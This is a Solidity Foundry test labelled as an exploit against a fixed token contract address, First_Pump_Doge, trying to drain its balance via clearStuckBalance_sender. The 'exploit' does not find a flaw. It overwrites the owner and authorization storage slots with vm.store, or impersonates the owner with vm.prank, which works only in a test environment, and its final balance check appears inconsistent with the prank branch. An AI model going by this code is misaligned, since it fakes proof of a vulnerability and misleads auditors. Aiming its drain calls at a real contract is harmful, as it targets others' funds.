pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface First_Pump_Doge {
    function owner() external view returns (address);
    function clearStuckBalance_sender(uint256 amountPercentage) external;
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xB19a9F26956d3d3c162c07A2509359AB42E0013d;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get owner dynamically in exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, let's send BNB to the contract
        deal(TARGET, 10 ether);

        // Record initial balance
        uint256 initialBalance = address(this).balance;

        // Try to find the owner by reading storage slot 0
        // In Auth contract, owner is stored at slot 0
        bytes32 ownerSlot = vm.load(TARGET, bytes32(uint256(0)));
        address contractOwner = address(uint160(uint256(ownerSlot)));
        console.log("Contract owner from storage:", contractOwner);

        // Check if owner is zero address
        if (contractOwner == address(0)) {
            // No owner set, we need to become owner
            // Set ourselves as owner in storage slot 0
            vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(address(this)))));
            // Also need to authorize ourselves - authorizations mapping is likely at slot 1
            // Calculate mapping slot for our address: keccak256(abi.encode(address(this), 1))
            bytes32 authSlot = keccak256(abi.encode(address(this), uint256(1)));
            vm.store(TARGET, authSlot, bytes32(uint256(1))); // Set to true

            // Now call the function as ourselves
            (bool success, ) = TARGET.call(abi.encodeWithSignature("clearStuckBalance_sender(uint256)", 100));
            require(success, "Call failed");
        } else {
            // Owner exists, impersonate them
            console.log("Impersonating owner:", contractOwner);
            vm.prank(contractOwner);
            (bool success, ) = TARGET.call(abi.encodeWithSignature("clearStuckBalance_sender(uint256)", 100));
            require(success, "Call failed");
        }

        // Verify our balance increased
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Balance should have increased");
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

